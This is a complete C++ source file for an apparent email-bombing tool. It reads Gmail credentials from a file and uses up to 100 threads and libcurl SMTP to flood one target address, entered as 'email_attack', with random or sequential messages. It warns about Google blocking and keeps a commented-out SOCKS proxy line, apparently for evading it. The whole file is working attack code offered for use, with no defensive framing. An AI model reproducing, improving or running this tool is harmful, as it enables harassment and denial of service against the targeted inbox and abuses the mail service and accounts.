#include <iostream>
#include <vector>
#include <fstream>
#include <thread>
#include <curl/curl.h>
#include <cstring>
#include <locale.h>
#include <sstream>
#include <unistd.h>

using namespace std;
#define fatal_error 1

const string CREATE_BY	= "IGORERFC";
const string VERSION	= "VERSION 4.0";

const string FILENAME_EMAILS  = "emailslist";	//The files must be created and located in the same folder as the program
const string FILENAME_TEXT    = "messagetext";	//The files must be created and located in the same folder as the program
string MESSAGE_TEXT_FROM_FILE;

const string GOOGLE_SERVICE = "smtp://smtp.gmail.com:587";

const int MIN_RAND_STR_SIZE = 5;
const int MAX_RAND_STR_SIZE = 30;

unsigned int number_of_errors = 0;
unsigned int number_sequence =  0;

static string payloadText[11];

struct upload_status { int lines_read; };

struct account {
	string login;
	string pass;
	account(){}
	account(const string &s);
	void set(const string &s);
	bool empty() const;
};

struct email_content{
	string name;
	string subject;
	string body;
};

//void error
void vError(const string &error_text, bool fatal = 0);

//set payload text
void setPayloadText(const string &to,
                    const string &from,
                    const string &nameFrom,
                    const string &subject,
                    const string &body);
					
//set payload text
static size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp);

//sending an email using curl
CURLcode sendEmail(const string &to,
		   const string &from,
		   const string &password,
		   const string &nameFrom,
		   const string &subject,
		   const string &body,
		   const string &url);

//generating a random string
string genRandomStr(const int &len);

//Getting text from a file text
void getTextFromFile(string &str, const string &file_name);

//Determining what this string is
string whatStr(const string &str_input);

//Sending emails (in the amount specified by the user)
void sendMail(const vector <account> &emails, 
	      const int &num_cycles,
	      const int &begin_send,
	      const string &email_attack, 
	      const email_content &content);

//Getting usernames and passwords from a file emails
void getMailFromFile(vector <account> *emails, const string &file_name);

int main(int argc, char *argv[])
{
	/*Init*/
	cout << "CREATE BY " << CREATE_BY << '\n';
	cout << "VERSION "   << VERSION   << '\n';
	
	srand(time(NULL));
	
	int num_cycles, num_threads;

	email_content content;
	string email_attack;
	vector <account> emails;
	
	getMailFromFile(&emails, FILENAME_EMAILS);
	getTextFromFile(MESSAGE_TEXT_FROM_FILE, FILENAME_TEXT);

	cout << emails.size() << " - GOOGLE MAIL WAS FOUND\n";
	
	if(!emails.size()) 
	vError("There are no emails !\n\
		Add emails in the format email@email.com:pass to file emails\n\
		Allow untrusted apps to access your account",
		fatal_error);
	/*Init end*/
	
	/*Read*/
	cout << "Write an email address for sending messages : ";
	getline (cin, email_attack);
	
	cout << "You can use 'r' for random or 's' for sequence\n";
	
	cout << "Enter your name (r/s) : ";
	getline (cin, content.name);
		
	cout << "Enter the subject of the letter (r/s) : ";
	getline (cin, content.subject);
	
	cout << "Enter 'fr' to use the text from the file\n"
		<< "Enter the text of the letter (r/s/fr) : ";
	getline (cin, content.body);
	
	cout << "Enter the number of cycles (min - 1) : ";
	cin >> num_cycles;
	
	cout << "Don't specify too much threads, google services will block you (100 <)\n"
		<< "Enter the number of threads (min - 1 & max - 100) : ";
	cin >> num_threads;
	
	cout << num_cycles * num_threads * emails.size() << " - will be sent\n";
	/*Read end*/
	/*Sending mails*/
	thread* th = new thread[num_threads];
	for (int thread_number = 0; thread_number < num_threads; thread_number++){
		th[thread_number] = thread
		(sendMail, 
		emails, 
		num_cycles,
		thread_number,	//to send email correctly // the thread number
		email_attack,
		content);
	}

	for (int thread_number = 0; thread_number < num_threads; thread_number++)
		th[thread_number].join();
	/*Sending mails end*/
	
	/*Output of the work result*/
	cout << num_cycles * num_threads * emails.size() - number_of_errors << " - emails sent successfully !\n";
	/*Output of the work result end*/
}

account::account(const string &s){
	this->set(s);
}
void account::set(const string &s){
	int f = s.find(':');
	if (f == string::npos)
		return;
	login = string{s.begin(), s.begin() + f};
	pass = string{s.begin() + f + 1, s.end()};
}
bool account::empty() const{
	return login.empty() && pass.empty();
}

void vError(const string &error_text, bool fatal)
{
	number_of_errors++;
	if(fatal) cout << "FATAL ";
	cout << "ERROR: " << error_text << "\n";
	if(fatal) exit(-1);
}


void setPayloadText(const string &to,
                    const string &from,
                    const string &nameFrom,
                    const string &subject,
                    const string &body)
{
    payloadText[ 0] = "Date: " ;
    payloadText[ 1] = "To: <"   + to   + ">\r\n";
    payloadText[ 2] = "From: " + nameFrom + " <sender@example.org>\r\n",
    payloadText[ 3] = "Cc: <"   + to   + "> (" + nameFrom + ")\r\n";
    payloadText[ 4] = "Message-ID: <@" + from.substr(from.find('@') + 1) + ">\r\n";
    payloadText[ 5] = "Subject: " + subject + "\r\n";
    payloadText[ 6] = "\r\n";
    payloadText[ 7] = body + "\r\n";
    payloadText[ 8] = "\r\n";
    payloadText[ 9] = "\r\n";
    payloadText[10] = "\r\n"; 
}

static size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp)
{

    static const char *pt[12] = {};

    for (int i = 0; i < 11; ++i) {
        pt[i] = payloadText[i].c_str();
    }

    pt[11] = NULL;

    struct upload_status *upload_ctx = (struct upload_status *)userp;
    const char *data;

    if ((size == 0) || (nmemb == 0) || ((size*nmemb) < 1)) {
        return 0;
    }

    data = pt[upload_ctx->lines_read];

    if (data) {
        size_t len = strlen(data);
        memcpy(ptr, data, len);
        upload_ctx->lines_read++;

        return len;
    }

    return 0;
}


CURLcode sendEmail(const string &to,
		   const string &from,
		   const string &password,
		   const string &nameFrom,
		   const string &subject,
		   const string &body,
		   const string &url)
{
    CURLcode ret = CURLE_OK;

    struct curl_slist *recipients = NULL;
    struct upload_status upload_ctx;

    upload_ctx.lines_read = 0;

    CURL *curl = curl_easy_init();

    setPayloadText(to, from, nameFrom, subject, body);

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_USERNAME,     from    .c_str());
        curl_easy_setopt(curl, CURLOPT_PASSWORD,     password.c_str());
        curl_easy_setopt(curl, CURLOPT_URL,          url     .c_str());

        curl_easy_setopt(curl, CURLOPT_USE_SSL,      (long)CURLUSESSL_ALL);

        curl_easy_setopt(curl, CURLOPT_MAIL_FROM,    ("<" + from + ">").c_str());
        recipients = curl_slist_append(recipients,   ("<" + to   + ">").c_str());

        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT,    recipients);
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
        curl_easy_setopt(curl, CURLOPT_READDATA,     &upload_ctx);
        curl_easy_setopt(curl, CURLOPT_UPLOAD,       1L);
        curl_easy_setopt(curl, CURLOPT_VERBOSE,      1L);
        
     // curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
     // curl_easy_setopt(curl, CURLOPT_PROXY, "109.194.175.135:9050");//Google blocks ;-(
        
	curl_easy_setopt(curl,CURLOPT_VERBOSE,0);
		
        ret = curl_easy_perform(curl);

        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    }

    return ret;
}

void sendMail(const vector <account> &emails, 
	      const int &num_cycles,
	      const int &begin_send,
	      const string &email_attack, 
	      const email_content &content) 
{	
	CURLcode err;
	
	const int vec_email_begin = begin_send % emails.size();
	int vec_email_num = vec_email_begin;
	
	for (int i = 0; i < num_cycles; i++){
		do
		{
			err = sendEmail
				(email_attack,
				emails[vec_email_num].login,
				emails[vec_email_num].pass,
				whatStr(content.name),
				whatStr(content.subject),
				whatStr(content.body),
				GOOGLE_SERVICE);
				cout << "Sent to - " << email_attack << '\n'
					 << "From - " 	<< emails[vec_email_num].login << '\n'
					 << "Thread ID - " << this_thread::get_id() << '\n'
					 << "Thread number - " << begin_send + 1 << '\n';
				if (err)
					vError("curl_easy_perform() failed:\n" + 
					static_cast<string>(curl_easy_strerror(err)) + 
					' ' + emails[vec_email_num].login);

			/*to send emails correctly and quickly*/
			vec_email_num++;	
			if(vec_email_num == (int)emails.size()) vec_email_num = 0;
		} while(vec_email_num != vec_email_begin);
		vec_email_num = vec_email_begin;
	}
}

string whatStr(const string &str_input)
{
	if (str_input == "r") return genRandomStr(rand() % (MAX_RAND_STR_SIZE - MIN_RAND_STR_SIZE + 1) + MIN_RAND_STR_SIZE);
	if (str_input == "s") return to_string(++number_sequence);
	if (str_input == "fr") return MESSAGE_TEXT_FROM_FILE;
	return str_input;		
}

void getMailFromFile(vector <account> *emails, const string &file_name)
{
	stringstream stext;
	string text;
	string line;
	account acc;

	getTextFromFile(text, file_name);
	stext << text;

	while(getline(stext, line)){
			acc.set(line);
			if (acc.empty())
				continue;
        	emails->push_back(acc);
	}
}

void getTextFromFile(string &str, const string &file_name)
{
	fstream fout;
	fout.open(file_name,ios::in);
	
	if (!fout.is_open())
		 vError(" File opening error! " + file_name, fatal_error);
		 
	char file_str[200];
	
	while (fout.getline(file_str, INT_MAX)){
		str += file_str;
		str += '\n';		
	}
	fout.close();
	str.pop_back();	//Delete last '\n'
}

string genRandomStr(const int &len) 
{
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";

	string str;
	
    for (int i = 0; i < len; ++i)
        str += alphanum[rand() % (sizeof(alphanum) - 1)];

    return str;
}
